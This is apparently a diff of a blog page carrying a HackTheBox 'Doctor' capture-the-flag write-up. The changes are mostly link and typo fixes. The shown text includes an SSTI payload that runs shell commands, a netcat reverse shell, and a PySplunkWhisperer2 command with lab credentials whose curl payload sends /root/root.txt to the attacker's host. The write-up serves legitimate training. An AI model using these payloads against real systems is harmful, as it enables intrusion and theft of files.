@@ -10,23 +10,23 @@
 Doctor is considered an easy Linux box by HackTheBox standards. It&amp;rsquo;s a well rounded box because its solution is composed of a mix of basic enumeration, basic priviledge escalation and also some recent CVE exploitation that can be accomplished with off-the-shelf tools." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
-<link rel="canonical" href="/infosec/htb/htb-doctor/" />
+<link rel="canonical" href="https://theredbay.net/infosec/htb/htb-doctor/" />
 
 
 
 
-<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="https://theredbay.net/assets/style.css">
 
-  <link rel="stylesheet" href="/assets/red.css">
-
-
+  <link rel="stylesheet" href="https://theredbay.net/assets/red.css">
 
 
 
 
-<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
 
-  <link rel="shortcut icon" href="/img/favicon/red.png">
+
+<link rel="apple-touch-icon" href="https://theredbay.net/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theredbay.net/img/favicon/red.png">
 
 
 
@@ -43,11 +43,11 @@ Doctor is considered an easy Linux box by HackTheBox standards. It&amp;rsquo;s a
 <meta property="og:type" content="article" />
 <meta property="og:title" content="Doctor - HackTheBox Write-up">
 <meta property="og:description" content="Write-up for the &#39;Doctor&#39; box from HackTheBox.eu" />
-<meta property="og:url" content="/infosec/htb/htb-doctor/" />
+<meta property="og:url" content="https://theredbay.net/infosec/htb/htb-doctor/" />
 <meta property="og:site_name" content="The Red Bay" />
 
   
-    <meta property="og:image" content="/img/favicon/red.png">
+    <meta property="og:image" content="https://theredbay.net/img/favicon/red.png">
   
 
 <meta property="og:image:width" content="2048">
@@ -152,7 +152,7 @@ Doctor is considered an easy Linux box by HackTheBox standards. It&amp;rsquo;s a
     
 <div class="post">
   <h1 class="post-title">
-    <a href="/infosec/htb/htb-doctor/">Doctor - HackTheBox Write-up</a></h1>
+    <a href="https://theredbay.net/infosec/htb/htb-doctor/">Doctor - HackTheBox Write-up</a></h1>
   <div class="post-meta">
     
       <span class="post-date">
@@ -231,7 +231,7 @@ and see. This reasoning comes from the fact that  this is the only service that 
 the standard SSH and HTTP services. We&rsquo;re here to learn new things, aren&rsquo;t we?</p>
 <p>For completion&rsquo;s sake, let&rsquo;s do an HTTP enumeration to see if we could glean any more information.
 This enumerates directories used by popular web applications or frameworks to fingerprint them. It
-also identifies common directories that can contain interesting files hosted on the web servers.
+also identifies common directories that can contain interesting files hosted on the web server.
 This is achieved by using the<br>
 <a href="https://nmap.org/nsedoc/scripts/http-enum.html"><code>--script=http-enum</code></a> flag with <code>nmap</code>.</p>
 <pre><code>$ nmap -sV --script=http-enum 10.10.10.209
@@ -262,7 +262,7 @@ that could possibly lead to our foothold.</p>
 <p>Next, on port <code>8089</code>, we have the <code>/services</code> directory from Splunk and a standard <code>robots.txt</code>. A
 <code>robots.txt</code> file  provides instructions to web crawlers on what they can or can&rsquo;t visit.  See
 <a href="https://www.robotstxt.org/robotstxt.html">here</a> for more information. As for the <code>/services</code>
-folder, pointing our web browser to <code>10.10.10.209:8089/services</code> serves up a authentication in
+folder, pointing our web browser to <code>10.10.10.209:8089/services</code> serves up an authentication
 prompt for which we do not have credentials yet. Let&rsquo;s take note of this and move on for now.</p>
 <h3 id="web-surfing">Web Surfing<a href="#web-surfing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>With basic enumeration done, let&rsquo;s engage the machine. Visiting the hosted static site through a
@@ -295,7 +295,7 @@ giving up, I noticed an email in the contact information section. The &ldquo;sen
 <code>info@doctors.htb</code>.</p>
 <p><img src="/img/htb-doctor/email.png" alt=""></p>
 <p>At wit&rsquo;s end, I passed <code>doctors.htb</code> as the host in my request header by using the
-<code>--header &quot;Host: doctors.htb&quot;</code> flag with curl <code>curl</code>.</p>
+<code>--header &quot;Host: doctors.htb&quot;</code> flag with <code>curl</code>.</p>
 <pre><code>$ curl -vvv http://10.10.10.209:80/ --header &quot;Host: doctors.htb&quot;
 *   Trying 10.10.10.209:80...
 * Connected to 10.10.10.209 (10.10.10.209) port 80 (#0)
@@ -322,16 +322,16 @@ giving up, I noticed an email in the contact information section. The &ldquo;sen
 </code></pre><p>Bingo. Werkzeug/Python served this up (Server info in the header) and is actually redirecting us
 (<code>302</code> HTTP reponse) to <code>/login?next=%2F</code>. Things like this is what what made this machine
 difficult in my opinion and pushed my curiosity a bit &ndash; there is a lot of non technical things to
-look out for.  Some information is hiding in plain sight.</p>
+look out for. Some information is hiding in plain sight.</p>
 <p>Alright, this is great and we&rsquo;re making progress but what actually happened here? Why would we
 even think of using <code>doctors.htb</code> in the host header? Apache (and web servers in general) can be
 configured to host multiple web sites based on domains and leverage the host header in the HTTP
-request to know which site to serve up to the client. Apache&rsquo;s has
+request to know which site to serve up to the client. Apache has
 <a href="https://httpd.apache.org/docs/2.4/vhosts/examples.html">documentation</a> on how to set this up.</p>
 <p>Adding the following entry to the <code>/etc/hosts</code> file</p>
 <pre><code>10.10.10.209	doctors.htb
 </code></pre><p>makes it possible to use <code>doctors.htb</code> to reach the <code>doctor</code> box. For more information on the
-<code>/etc/hosts</code>, look up &ldquo;local DNS&rdquo;.</p>
+<code>/etc/hosts</code>, look up &ldquo;local DNS&rdquo; in your favorite search engine.</p>
 <p>By surfing to <code>http://doctors.htb</code>, we are leveraging this addition and our browser will use
 <code>doctors.htb</code> in the host header of the outgoing HTTP request. We are now presented a login screen</p>
 <p><img src="/img/htb-doctor/login.png" alt=""></p>
@@ -366,7 +366,7 @@ the body section</p>
 	&lt;/<span style="color:#f92672">div</span>&gt;
 	<span style="color:#75715e">&lt;!-- Navbar Right Side --&gt;</span>
 </code></pre></div><p>Beta testing? Sounds promising&hellip; If we try going to <code>http://doctors.htb/archive</code>, we are met with
-a blank page.  Looking at the response through our browser&rsquo;s dev tools, we see that it contains the
+a blank page. Looking at the response through our browser&rsquo;s dev tools, we see that it contains the
 titles of the messages we created in the forum earlier and that the injection recon we tried
 (<code>{{ 7*7 }}</code>) is actually computed (<code>&lt;title&gt;49&lt;/title&gt;</code>)</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
@@ -384,7 +384,7 @@ titles of the messages we created in the forum earlier and that the injection re
 		<span style="color:#f92672">&lt;/channel&gt;</span>
 </code></pre></div><p>This computation is enough to know that the templating engine is parsing the injection as valid
 directives and executing it as Python code. It&rsquo;s time to see if we can get it to execute something
-on the command line through Python directives.  The payload would look something like this:</p>
+on the command line through Python directives. The payload would look something like this:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami; id&#39;</span>)<span style="color:#f92672">.</span>read()}}
 </code></pre></div><p>Let&rsquo;s not go into crazy detail about this but what we&rsquo;re doing is requesting, through Python, that
 the remote machine executes the <code>whoami</code> and <code>id</code> shell commands. <code>whoami</code> informs us who the
@@ -443,7 +443,7 @@ using netcat to pass strings back and forth between the remote host and our mach
 received are written into the <code>/tmp/asd</code> file and that is getting piped into the <code>/usr/bin/sh</code>
 command to execute whatever we just sent it.</p>
 <p>This <a href="https://www.brianstorti.com/understanding-shell-script-idiom-redirect/">post</a> is a good
-startng point if you&rsquo;re curious about the redirection and piping  mysticism in the above string of
+startng point if you&rsquo;re curious about the redirection and piping mysticism in the above string of
 commands.</p>
 <p>This new revised command grants us the reverse shell we are after.</p>
 <pre><code>$ nc -lvp 4545
@@ -485,9 +485,9 @@ $
 but that&rsquo;s the file that contains the user flag. Based on the permission scheme for it, only <code>shaun</code>
 (or <code>root</code>) can read its contents. We can carry on by using tools like
 <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS</a>
-or sleuthing manually through the system. These types of enumeration tool run a bunch of commands
+or sleuthing manually through the system. These types of enumeration tools run a bunch of commands
 and they also look around the system and its log files. Enumeration tools try to identify potential
-targets for privilege escalatiom but will not do exploits for you. You will be handed a thorough
+targets for privilege escalation but will not do exploits for you. You will be handed a thorough
 report when the tool completes its run which will contain a large amount of possible escalation
 vectors. This can be seriously overwhelming for someone who isn&rsquo;t familar with this type of thing.
 This amount of information will have us spend more time reading the report than actually trying
@@ -559,7 +559,7 @@ web         1734  0.0  0.0  17668   656 ?        S    00:07   0:00 grep splunkd
 </code></pre><p>Following the article and using the <a href="https://github.com/cnotin/SplunkWhisperer2"><code>PySplunkWhisperer2</code></a>
 tool, all we have to do is set it up so that <code>PySplunkWhisperer2_remote</code> sends us the
 <code>/root/root.txt</code> file. Since we already validated that we can use <code>shaun</code>&rsquo;s credentials for Splunk,
-that&rsquo;s what we&rsquo;ll pump into PySplunkWhisperer2 for the user name and password.</p>
+that&rsquo;s what we&rsquo;ll pump into <code>PySplunkWhisperer2</code> for the user name and password.</p>
 <pre><code>python PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password &quot;Guitar123&quot; --payload &quot;curl -F 'data=@/root/root.txt' http://&lt;ip&gt;:4545&quot; --lhost &lt;ip&gt;
 </code></pre><p>In the above command, as previously stated, <code>&lt;ip&gt;</code> has to be replaced with your machine&rsquo;s IP address
 on the HackTheBox.eu network. We also need to setup netcat to receive the content with the following
@@ -588,10 +588,10 @@ the <code>/archive</code> endpoint where the actual SSTI is happening, getting t
 the password (needle in a haystack) were the most time consuming parts of this machine. The
 interesting thing in all of it is that it didn&rsquo;t take much wizardry to extract the necessary
 information to progress through the different steps and obtain the user flag. A good eye and enough
-curiosity is all that it took. I thoroughly enjoyed the learning opportunities this box provded and
+curiosity is all that it took. I thoroughly enjoyed the learning opportunities this box provided and
 the fact that it forces you to dig and think outside the box instead of relying on scripts and CVEs.</p>
 <p>Rooting the box after finding the credentials was pretty straight forward. Thanks for sticking
-around and reading through  this article. I hope you enjoyed reading it as much as I enjoyed writing
+around and reading through this article. I hope you enjoyed reading it as much as I enjoyed writing
 it. Special thanks go to my brother for his help with the review process of this article!</p>
 <ul>
 <li>redbay</li>
@@ -644,11 +644,11 @@ replace <code>&lt;ip&gt;</code> with your machine&rsquo;s IP address on the Hack
   </div>
 </footer>
 
-<script src="/assets/main.js"></script>
-<script src="/assets/prism.js"></script>
+<script src="https://theredbay.net/assets/main.js"></script>
+<script src="https://theredbay.net/assets/prism.js"></script>
 
 
-  <script src="/assets/languageSelector.js"></script>
+  <script src="https://theredbay.net/assets/languageSelector.js"></script>
 
 
 
